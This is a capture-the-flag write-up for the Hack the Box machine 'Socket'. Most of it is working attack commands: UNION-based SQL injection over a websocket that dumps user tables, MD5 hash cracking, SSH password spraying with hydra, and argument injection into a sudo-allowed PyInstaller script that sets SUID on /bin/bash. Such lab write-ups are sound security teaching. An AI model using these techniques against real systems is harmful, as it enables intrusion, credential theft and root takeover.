---
title: "HTB • Socket"
tags:
  - "Code Review"
  - "Intermediate"
  - "Linux"
  - "Medium Difficulty"
  - "Python"
  - "Reversing"
  - "SQL Injection"
  - "Sudo"
  - "Web"
  - "WebSocket"
  - "Hash Cracking"
excerpt: "Socket is a medium difficulty Linux machine on Hack the Box that involves reverse engineering, SQL injection, sudo exploitation, and bash scripting"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-socket/"
---

Socket is a medium difficulty Linux machine created by [**kavigihan**](https://app.hackthebox.com/users/389926) on [**Hack the Box**](https://app.hackthebox.com/machines/Socket) that features a website hosting compiled applications that hint to the usage of a websocket endpoint.
This endpoint is actually vulnerable to **SQL injection**, which leads to a password hash and a name.
Once the password is recovered, the name is used to generate a username wordlist which is used over SSH to find the _tkeller_ user.
This user has special **sudo** permissions to execute a specific vulnerable script as any user.
This script is then used to execute privileged commands.

## Initial Recon

We'll first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@red_team (bash)
rhost="10.10.11.206" # Target IP address
lhost="10.10.14.4" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

The open ports reported in the scan include:

| Transport | Port | Service    | Product           | Version                     |
|:----------|:-----|:-----------|:------------------|:----------------------------|
| TCP       | 22   | SSH        | OpenSSH           | 8.9p1 Ubuntu 3ubuntu0.1     |
| TCP       | 80   | HTTP       | Apache httpd      | 2.4.52 (Ubuntu)             |
| TCP       | 5789 | WebSockets | Python/websockets | Python/3.10 websockets/10.4 |

## Web

We'll start off by investigating the HTTP server on port **80**.

### Content Discovery

Sending a GET request to <http://10.10.11.206/> results in a redirect to <http://qreader.htb/>.
We'll add **qreader.htb** to `/etc/hosts`{:.filepath} so we can visit the intended VHOST in our browser.

```bash
# bryan@red_team (bash)
curl http://$rhost/ -I # redirected to http://qreader.htb/
curl http://$rhost/ -I -H 'Host: qreader.htb' # different response code. VHOST is valid
echo -en "$rhost\tqreader.htb" | sudo tee -a /etc/hosts
```
{:.nolineno}

![Home page](homepage.png)

Towards the bottom of the page, there is mention of a desktop app for Windows and Linux to generate QR codes.
Lets download the Linux version and see what information we can gather.

![Download reference](downloads.png)

The downloaded archive is over 100 MB!

```bash
# bryan@red_team (bash)
7z l QReader_lin_v0.0.2.zip # Contains app/qreader, app/test.png
7z x QReader_lin_v0.0.2.zip # Extract files
file app/qreader # File is a dynamic stripped ELF
```
{:.nolineno}

One explanation for the executable being so huge is that it is a product of something like **PyInstaller**. We'll verify this by checking for certain strings that would indicate that this was written in Python rather than a traditional compiler language.

```bash
# bryan@red_team (bash)
strings -eS app/qreader | grep -Ei python # Plenty of references to python
strings -eS app/qreader | grep -Ei pyinstaller # Reference to PyInstaller!
```
{:.nolineno}

It does seem that this was built with PyInstaller, which is good for us because we can easily decompile the program using something like `pyinstxtractor.py`{:.filepath} from [python-exe-unpacker](https://github.com/WithSecureLabs/python-exe-unpacker) along with [Decompyle++](https://github.com/zrax/pycdc).

```bash
# bryan@red_team (bash)
pyinstxtractor app/qreader # Extract the python bytecode
ls -l qreader_extracted/*qreader* # Here's the actual program bytecode
pycdc qreader_extracted/qreader.pyc -o qreader.py # Decompile to python source
```
{:.nolineno}

The source code has one function called _version_ that sends the installed version to a websocket endpoint at `/version`{:.filepath} on port 5789.

### WebSockets

Let's try replicating the version message in `qreader.py`{:.filepath} using [this simple websocket client](https://github.com/bryanmcnulty/ctf-scripts/blob/main/web/wscurl.py).

```bash
# bryan@red_team (bash)
send() {
  json=$(echo {} | jq --arg _ "$1" '.version=$_')
  wscurl $rhost:5789/version -d "$json"
}
send "0.0.2" # It works!
send "0.0.1" # This returns a different response
send "_" # Got "Invalid version!"
```
{:.nolineno}

It seems like the backend is processing the version then returning a set of values related to that particular version (if valid).
There are a number of ways this could be done, but it's likely the work of SQL queries.
With this in mind, let's try sending some SQL injection payloads that could break an insecure implementation.

```bash
# bryan@red_team (bash)
send "'" # Message: "Invalid version!"
send '"' # Blank response... Internal error?
send '0.0.2"--' # SQL Injection! (probably)
```
{:.nolineno}

Sending a double quote results in an unexpected blank response, so we check if an SQL comment would negate this and it sure does!
This is a classic indication of an SQL injection vulnerability.

### SQL Injection

We'll try extracting some database information on that injection point using a **UNION SELECT** statement. We can assume that the number of columns is at least three or four based on the number of JSON keys returned given a valid version.

```bash
# bryan@red_team (bash)
send '" UNION SELECT 1337,NULL,NULL,NULL--' # Confirmed 4 columns
send '" UNION SELECT 0,@@version,0,0--' # Error. Probably not MySQL...
send '" UNION SELECT 0,version(),0,0--' # Error. Probably not PostgreSQL...
send '" UNION SELECT 0,sqlite_version(),0,0--' # Sqlite is a match!
```
{:.nolineno}

We are able to determine that the backend is **SQLite 3.37.2**. Now that we know this, we can easily extract the database schema from the *sqlite_schema* table.

```bash
# bryan@red_team (bash)
send '" UNION SELECT 0,group_concat(sql,CHAR(0xa)),0,0 FROM sqlite_schema--' | tee res.json
jq -r .message.version res.json | sed 's/$/;/' | tee schema.sql
```
{:.nolineno}

```sql
CREATE TABLE sqlite_sequence(name,seq);
CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER);
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT);
CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT);
CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE);
CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id));
```
{:file="schema.sql"}

We'll extract a few non-standard tables starting with _users_.

```bash
# bryan@red_team (bash)
mkdir tables
send '" UNION SELECT 0,group_concat(printf("%s|%s|%s",username,password,role),CHAR(0xa)),0,0 FROM users--' |
  jq -r .message.version | tee tables/users.txt # dump users table to tables/users.txt
send '" UNION SELECT 0,group_concat(printf("%s|%s|%s|%s",reporter_name,subject,description,reported_date),CHAR(0xa)),0,0 FROM reports--' |
  jq -r .message.version | tee tables/reports.txt # dump reports table to tables/reports.txt
send '" UNION SELECT 0,group_concat(printf("%s|%s|%s|%s",answered_by,answer,answered_date,status),CHAR(0xa)),0,0 FROM reports--' |
  jq -r .message.version | tee tables/answers.txt # dump answers table to tables/answers.txt
```
{:.nolineno}

The _users_ table contains a single row with a password hash associated with the username _admin_.
assuming that this is an MD5 hash based on the length and context, we'll try to crack it with [John the Ripper](https://github.com/openwall/john).

```bash
# bryan@red_team (bash)
wl=~/wordlist/rockyou.txt # use standard rockyou.txt list
john --wordlist=$wl --format=raw-md5 <(echo admin:0c090c365fa0559b151a43e0fea39710)
```
{:.nolineno}

We successfully recover the password **`denjanjade122566`**!
If we try to login over SSH using these credentials however, authentication fails.
It is likely that this password has been reused by the subject for other services so the issue might be the username.
We do notice from looking at the _answers_ table that the person managing the admin account uses the name **Thomas Keller**.

>
Hello Mike,\
\
 We have confirmed a valid problem with handling non-ascii characters. So we suggest you to stick with ascii printable characters for now!\
\
**Thomas Keller**

If Thomas also has an OS account, it is likely that they use a username related to their actual name.
We'll be using [username-anarchy](https://github.com/urbanadventurer/username-anarchy) to generate usernames from the information we have, then we'll use [thc-hydra](https://github.com/vanhauser-thc/thc-hydra) to spray the password we found.

```bash
# bryan@red_team (bash)
username-anarchy Thomas Keller | tee usernames.wl
hydra -L usernames.wl -p 'denjanjade122566' ssh://$rhost
```
{:.nolineno}

We find that the username **`tkeller`** is valid with the password **`denjanjade122566`**.
We'll use these credentials to login over SSH with [PwnCat](https://pypi.org/project/pwncat-cs/).

```bash
# bryan@red_team (bash)
pwncat-cs "ssh://tkeller:denjanjade122566@$rhost"
```
{:.nolineno}

## Local Privilege Escalation

We begin by running a few generic commands to explore our current context.

```bash
# tkeller@socket (bash)
id # Member of unusual group: shared
sudo -l # Special sudo permissions...
```
{:.nolineno}
>
```
User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

It turns out, we can run a script at `/usr/local/sbin/build-installer.sh`{:.filepath} as root.
Let's check out this script and see how we might exploit it and elevate to root.

```bash
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```
{:file="/usr/local/sbin/build-installer.sh"}

It looks like the purpose of this script is to build executables from python source using PyInstaller.
We do notice that the script does a poor job of escaping input when passing it to the PyInstaller executable.
Take this line for example:

```bash
/root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
```
{:.nolineno}

In this line, the _name_ variable (derived from the second argument) is passed to `pyinstaller` as the first positional argument.
The issue is that bash will expand the _name_ variable making it trivial to pass additional arguments.
As a harmless example, we can pass the `--help` flag.

```bash
# tkeller@socket (bash)
sudo build-installer.sh make "--help x.py"
```
{:.filepath}

Looking at the [PyInstaller documentation](https://pyinstaller.org/en/stable/usage.html), we find a few flags that could allow us to perform various actions on the local filesystem.

### Elevated Execution

There's a certain flag that's particularly interesting defined as `--upx-dir`.
It advertises the ability to modify the search path for the UPX executable, which could allow us to execute an arbitrary file as root.
If we change the search path to a writable directory, we could plant a file named `upx`{:.filepath} which should then be executed by PyInstaller.

```bash
# tkeller@socket (bash)
dir=$(mktemp -d)
echo -e '#!/bin/bash\nchmod +s /bin/bash' > $dir/upx && chmod +x $dir/upx
sudo build-installer.sh make "--upx-dir=$dir $(mktemp --suffix=.py)"
ls -l `which bash`
```
{:.nolineno}

We successfully coerce the execution of our executable, which sets the SUID bit in `/bin/bash`{:.filepath}.
We gain a root shell with `bash -p`, grab the root flag, then normalize the SUID bit with `chmod -s /bin/bash`